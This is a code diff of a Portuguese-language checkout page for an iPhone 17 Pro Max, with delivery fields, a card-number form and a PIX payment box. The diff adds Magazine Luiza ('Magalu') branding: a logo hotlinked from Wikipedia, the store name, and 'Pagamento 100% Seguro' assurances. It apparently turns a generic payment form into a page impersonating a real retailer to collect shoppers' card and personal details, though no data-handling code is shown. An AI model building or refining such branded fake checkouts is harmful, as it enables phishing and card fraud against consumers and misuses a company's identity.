@@ -10,23 +10,45 @@ body {
   font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif; 
   background: linear-gradient(180deg, #f0f4f8 0%, #ffffff 100%); 
   min-height: 100vh;
+  padding-top: 72px;
 }
 
-/* === CABEÇALHO AZUL === */
 .cabecalho {
   background: linear-gradient(135deg, #0066FF 0%, #0052CC 100%);
-  padding: 16px 20px;
-  text-align: center;
+  padding: 12px 20px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
   color: white;
-  font-size: 18px;
-  font-weight: 600;
   box-shadow: 0 2px 12px rgba(0, 102, 255, 0.18);
-  position: sticky;
+  position: fixed;
   top: 0;
-  z-index: 100;
+  left: 0;
+  right: 0;
+  z-index: 999;
+}
+.logo-container {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+.logo {
+  height: 42px;
+  width: auto;
+  object-fit: contain;
+}
+.loja-nome {
+  font-size: 17px;
+  font-weight: 700;
+  letter-spacing: 0.3px;
+}
+.cabecalho-info {
+  font-size: 12px;
+  opacity: 0.9;
+  text-align: right;
+  line-height: 1.4;
 }
 
-/* === CONTAINER PRINCIPAL === */
 .container {
   max-width: 520px;
   margin: 16px auto 30px;
@@ -36,7 +58,6 @@ body {
   overflow: hidden;
 }
 
-/* === RESUMO DO PRODUTO === */
 .resumo {
   padding: 20px;
   background: linear-gradient(135deg, #F0F7FF 0%, #E6F0FF 100%);
@@ -73,7 +94,6 @@ body {
   margin-top: 2px;
 }
 
-/* === BARRA DE PROGRESSO === */
 .progresso {
   display: flex;
   padding: 18px 24px;
@@ -116,7 +136,6 @@ body {
   font-weight: 500;
 }
 
-/* === FORMULÁRIO === */
 .conteudo {
   padding: 24px;
 }
@@ -157,7 +176,6 @@ h2 {
   margin-bottom: 16px;
 }
 
-/* === BOTÕES === */
 .btn {
   width: 100%;
   border: none;
@@ -246,12 +264,18 @@ h2 {
 <body>
 
 <div class="cabecalho">
-  Pagamento Seguro 🔒
+  <div class="logo-container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/1/1b/Magalu_-_novo_logo.png?utm_source=pt.wikipedia.org&utm_campaign=index&utm_content=original" alt="Magalu" class="logo">
+    <span class="loja-nome">Magalu</span>
+  </div>
+  <div class="cabecalho-info">
+    🔒 Pagamento 100% Seguro<br>
+    ✅ Seus dados protegidos
+  </div>
 </div>
 
 <div class="container">
 
-  <!-- RESUMO DO PRODUTO -->
   <div class="resumo">
     <img src="https://a-static.mlcdn.com.br/420x420/apple-iphone-17-pro-max-256gb-laranja-cosmico-69-48mp-ios-5g/magazineluiza/240585900/e167416ee9fc503730ed00858aa49109.jpg" alt="iPhone 17 Pro Max">
     <div class="resumo-info">
@@ -262,7 +286,6 @@ h2 {
     </div>
   </div>
 
-  <!-- BARRA DE PROGRESSO -->
   <div class="progresso">
     <div class="passo ativo" id="passo-1">
       <div class="passo-num">1</div>
@@ -278,7 +301,6 @@ h2 {
   <input type="hidden" name="produto" value="iPhone 17 Pro Max 256GB - Laranja-Cósmico">
   <input type="hidden" name="valor_total" value="R$ 8.113,80 à vista / 12x R$ 676,15 sem juros">
 
-  <!-- PASSO 1: ENTREGA -->
   <div id="entrega" class="conteudo">
     <h2>📦 Dados de Entrega</h2>
     
@@ -332,7 +354,6 @@ h2 {
     <button type="button" class="btn btn-proximo" onclick="irParaPagamento()">Continuar para Pagamento →</button>
   </div>
 
-  <!-- PASSO 2: PAGAMENTO -->
   <div id="pagamento" class="conteudo escondido">
     <h2>💳 Forma de Pagamento</h2>
 
@@ -351,7 +372,6 @@ h2 {
       </select>
     </div>
 
-    <!-- DADOS DO CARTÃO -->
     <div id="dados-cartao" class="escondido">
       <div class="grupo">
         <label class="label">Número do Cartão</label>
@@ -377,7 +397,6 @@ h2 {
       </div>
     </div>
 
-    <!-- INFORMAÇÕES DO PIX -->
     <div id="dados-pix" class="escondido">
       <div class="caixa-pix">
         <p>✅ R$ 8.113,80</p>
